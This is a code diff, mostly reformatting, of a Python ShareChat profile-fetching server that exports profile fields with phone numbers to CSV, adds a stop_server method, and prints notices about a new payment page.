+                        "Phone",
+                        "Username",
+                        "Name",
+                        "Followers",
+                        "Following",
+                        "Posts",
+                        "Gender",
+                        "Language",
+                        "Region",
+                        "Status",
+                        "Fetch Time",
+                        "Timestamp",
+                    ]
+                )
+
                 for result in self.current_results:
-                    if result.get('status') == 'SUCCESS':
-                        data = result.get('data', {})
-                        writer.writerow([
-                            result.get('phone', ''),
-                            result['username'],
-                            data.get('name', ''),
-                            data.get('followers', ''),
-                            data.get('following', ''),
-                            data.get('posts', ''),
-                            data.get('gender', ''),
-                            data.get('language', ''),
-                            data.get('region', ''),
-                            'SUCCESS',
-                            data.get('fetch_time', ''),
-                            data.get('timestamp', '')
-                        ])
-            
+                    if result.get("status") == "SUCCESS":
+                        data = result.get("data", {})
+                        writer.writerow(
+                            [
+                                result.get("phone", ""),
+                                result["username"],
+                                data.get("name", ""),
+                                data.get("followers", ""),
+                                data.get("following", ""),
+                                data.get("posts", ""),
+                                data.get("gender", ""),
+                                data.get("language", ""),
+                                data.get("region", ""),
+                                "SUCCESS",
+                                data.get("fetch_time", ""),
+                                data.get("timestamp", ""),
+                            ]
+                        )
+
             print(f"✅ CSV exported: {csv_file}")
-    
+
     def run_server_only(self):
         """
         Render के लिए server only mode
@@ -2032,17 +2507,18 @@ class ShareChatLiveFetcher:
         if not self.start_server():
             print("❌ Failed to start server!")
             return False
-        
+
         print("\n" + "=" * 70)
         print("🚀 SHARECHAT SERVER RUNNING ON RENDER")
         print("=" * 70)
         print(f"Your app will be available at: https://your-app-name.onrender.com")
         print("Frontend: /index.html")
         print("Profile page: /profile.html")
+        print("Payment page: /payment.html (with ESAME functionality)")
         print("API endpoint: POST /fetch-profile")
         print("=" * 70)
         print("\nServer is running in production mode...")
-        
+
         # Keep the main thread alive
         try:
             while True:
@@ -2050,8 +2526,18 @@ class ShareChatLiveFetcher:
         except KeyboardInterrupt:
             print("\n🛑 Server shutting down...")
             self.stop_server()
-        
+
         return True
+
+    def stop_server(self):
+        """
+        Server stop करें
+        """
+        self.is_running = False
+        if self.server:
+            self.server.server_close()
+        self.logger.info("Server stopped")
+
 
 def main():
     """
@@ -2065,13 +2551,15 @@ def main():
     print("1. Start a web server on 0.0.0.0:PORT")
     print("2. Serve your original HTML files")
     print("3. Handle form submissions via /fetch-profile endpoint")
+    print("4. Include ESAME payment functionality")
     print("=" * 70)
-    
+
     # Create and run fetcher
     fetcher = ShareChatLiveFetcher()
-    
+
     # Run in server-only mode for Render
     fetcher.run_server_only()
+
 
 if __name__ == "__main__":
     main()
